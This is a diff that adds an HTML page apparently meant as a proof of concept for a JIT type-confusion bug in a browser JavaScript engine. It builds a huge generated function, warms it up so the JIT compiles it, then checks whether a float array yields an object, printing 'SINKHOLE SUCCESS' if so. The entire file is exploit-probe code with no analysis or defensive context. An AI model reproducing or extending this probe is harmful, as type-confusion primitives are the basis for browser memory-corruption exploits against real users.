@@ -1,0 +1,32 @@
+<!DOCTYPE html><html><body><script>
+let lines = [];
+lines.push("function sink_test(x, arr, obj) {");
+for (let i = 0; i < 650; i++) lines.push(`  if (x === ${i}) return ${i};`);
+lines.push("  arr[0] = obj;");
+lines.push("  let r = 0;");
+lines.push("  for (let k in [1]) {");
+lines.push("    r = arr[1];");
+lines.push("  }");
+lines.push("  return r;");
+lines.push("}");
+lines.push("return sink_test;");
+
+let fn = new Function(lines.join("\n"))();
+let dummy = { a: 1 };
+
+console.log("Warmup starting...");
+for (let i = 0; i < 20000; i++) {
+  let a = [1.1, 2.2, 3.3];
+  fn(i, a, dummy);
+}
+console.log("Warmup done! Calling with float array now...");
+
+let farr = [1.1, 2.2, 3.3];
+let res = fn(1000, farr, dummy);
+console.log("res type:", typeof res, "res:", res);
+if (typeof res === "object") {
+  console.log("=== SINKHOLE SUCCESS! Object:", res, "===");
+} else {
+  console.log("res is still:", res);
+}
+</script></body></html>
